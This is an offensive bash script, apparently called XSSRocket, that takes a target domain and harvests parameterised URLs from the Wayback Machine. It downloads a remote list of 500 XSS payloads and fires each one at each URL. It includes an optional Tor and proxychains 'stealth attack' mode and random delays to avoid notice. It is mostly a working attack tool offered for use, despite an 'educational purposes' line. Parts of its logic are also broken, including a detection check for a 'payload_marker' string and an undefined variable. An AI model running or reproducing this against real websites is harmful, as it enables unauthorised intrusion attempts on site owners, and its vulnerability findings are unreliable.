#!/bin/bash
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security

# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")

# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}

# Check if lolcat, fortune-mod, figlet and curl are installed
if ! command -v lolcat > /dev/null; then
  echo "lolcat not found, installing..."
  if command -v dnf > /dev/null; then
    sudo dnf install -y lolcat
  elif command -v yum > /dev/null; then
    sudo yum install -y lolcat
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y lolcat
  else
    echo "Error: package manager not found, please install lolcat manually"
    exit 1
  fi
fi

if ! command -v fortune > /dev/null; then
  echo "fortune-mod not found, installing..."
  if command -v dnf > /dev/null; then
    sudo dnf install -y fortune-mod
  elif command -v yum > /dev/null; then
    sudo yum install -y fortune-mod
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y fortune-mod
  else
    echo "Error: package manager not found, please install fortune-mod manually"
    exit 1
  fi
fi

if ! command -v figlet > /dev/null; then
  echo "figlet not found, installing..."
  if command -v dnf > /dev/null; then
    sudo dnf install -y figlet
  elif command -v yum > /dev/null; then
    sudo yum install -y figlet
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y figlet
  else
    echo "Error: package manager not found, please install figlet manually"
    exit 1
  fi
fi

if ! command -v curl > /dev/null; then
  echo "curl not found, installing..."
  if command -v dnf > /dev/null; then
    sudo dnf install -y curl
  elif command -v yum > /dev/null; then
    sudo yum install -y curl
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y curl
  else
    echo "Error: package manager not found, please install curl manually"
    exit 1
  fi
fi

echo "All dependencies installed successfully"

# Print the quote
echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
sleep 1
figlet "HACK THE PLANET!" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
echo "[YOUR ARE USING XSSRocket.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING XSSRocket.sh!" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

# Ask the user to enter a domain
echo "Enter the domain you want to attack: " | lolcat
read domain
# Ask the user if they want to perform a stealth attack
echo "Do you want to perform a stealth attack? (y/n)" | lolcat
read stealth_attack
# Use proxychains if the user said yes
if [[ $stealth_attack == "y" ]]; then
    # Check if proxychains4 is installed
    echo "Checking & Installing Proxychains..." | lolcat
    if ! command -v proxychains4 > /dev/null; then
        echo "proxychains4 is not installed, installing now..." | lolcat
        # Check the architecture used
        architecture=$(uname)
        # Install proxychains4 based on the architecture
        if [[ "$(uname -s)" == "Darwin" ]]; then
            brew install proxychains-ng
            brew install torsocks
            torsocks
        elif [[ "$(uname -s)" == "Linux" ]]; then
            sudo apt-get install -y proxychains4
            sudo apt-get install -y torsocks
            torsocks
        else
            echo "OS not supported or detected" | lolcat
            exit 1
        fi
    else
        echo "proxychains4 is already installed, proceeding with stealth attack..." | lolcat
        proxychains4 waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
    fi
else
    # Fetch URLs normally
    echo "Proceeding with attack without Stealh..." | lolcat
    waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
fi

# Use a remote XSS payload list from github
payload_file="xss-payload-list.txt"
payload_url="https://raw.githubusercontent.com/blackhatethicalhacking/XSSRocket/main/top-500-xss-payloads.txt"
if test ! -f "$payload_file"; then
    echo "Downloading Default Payload list from: $payload_url" | lolcat
    if ! wget $payload_url -O $payload_file; then
        echo "Error: Failed to download default payload list." | lolcat
        exit 1
    else
        echo "Payload list already present in the current folder, proceeding" | lolcat
    fi
fi
#Install PV
echo "Installing Progress Bar depending on the architecture of your machine used..." | lolcat
# Check the architecture used
architecture=$(uname)
# Install pv based on the architecture
# Check for operating system architecture and install pv accordingly
if [[ "$(uname -s)" == "Darwin" ]]; then
    if ! command -v pv > /dev/null; then
        echo "MacOS Detected and pv is not installed, installing now..." | lolcat
        brew install pv
    else
        echo "Linux Detected and pv is already installed, proceeding..." | lolcat
    fi
elif [[ "$(uname -s)" == "Linux" ]]; then
    if ! command -v pv > /dev/null; then
        echo "pv is not installed, installing now..."
        sudo apt-get install -y pv
    else
        echo "pv is already installed, proceeding..."
    fi
else
    echo "OS not supported or detected"
    exit 1
fi
echo "Starting Attack:" | lolcat
# Use cat to read the payload_list and send the GET request with that list of payload
# Initialize counter variable
# Use cat to read the payload_list and send the GET request with that list of payload
# Initialize counter variable
counter=0
while read payload; do
        for url in $(cat param_urls.txt | sed 's/\([^=&?]*\)=.*/\1=/g'); do
                echo "Sending payload $payload to $url" 
                # Add random delay between requests
                random_delay=$(awk 'BEGIN{srand();print int(rand()*2)}')
sleep $random_delay

                response=$(curl -s -G "$url$payload" -w "%{http_code}")
                status_code=${response: -3}
                if echo "$response" | grep -q "payload_marker"; then
                        echo "Possibly Vulnerable to XSS ! $url" | lolcat
                        echo $url >> affected_urls.txt
                        counter=$((counter+1))
                        triggered_payload="$payload"
                fi
                if [[ $status_code == "200" ]]; then
                        echo -e "\033[0;32m$status_code\033[0m"
                else
                        echo -e "\033[0;31m$status_code\033[0m"
                fi
                # Display the full URL with payload
                echo "$url$payload"
                # Add progress bar
                echo -n "." | pv -qL 10
        done
done < <(pv -N "XSS Payloads" xss-payload-list.txt)

if [ -n "$triggered_payload" ]; then
    echo "Displaying the payload that triggered the vulnerability: $triggered_payload"
else
    echo "No vulnerabilities found"
fi

echo "Creating the Folder and saving all the results..." | lolcat
# Create a folder with the domain name and save the results
# Clean the domain input from illegal characters
clean_domain=`echo $domain | tr -cd '[:alnum:]\n\r'`

# Create the folder
mkdir $clean_domain
echo "$param_urls" >> $clean_domain/parameter_urls.txt
echo "${affected_urls[@]}" >> $clean_domain/affected_urls.txt
# Move the txt files generated inside the folder
mv *.txt $clean_domain/
if [ -s affected_urls.txt ]; then
    echo "Summary of the Scan:" | lolcat
    echo "A total of $(cat affected_urls.txt | wc -l) possible XSS Injections are found."
    echo "Possible Vulnerable URLs:" | lolcat
    cat affected_urls.txt
    echo "Found Vulnerability here:" | lolcat
    echo "Payload: (show the payload inserted)" | lolcat
else
    echo "Summary of the Scan:" | lolcat
    echo "No Vulnerabilities Found" | lolcat
fi
sleep 1
echo "Thank you for using our tool, if you feel it has helped you, you can buy us a coffee here: https://www.buymeacoffee.com/bheh" | lolcat
sleep 1
echo "Copyrights 2023 - All rights reserved - chris@bheh.net"
# Matrix effect
echo "Entering the Matrix for 5 seconds:" | toilet --metal -f term -F border

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
P='\033[0;35m'
C='\033[0;36m'
W='\033[1;37m'

for ((i=0; i<5; i++)); do
    echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
    sleep 0.2
    echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
    sleep 0.2
    echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
    sleep 0.2
    echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
    sleep 0.2
done

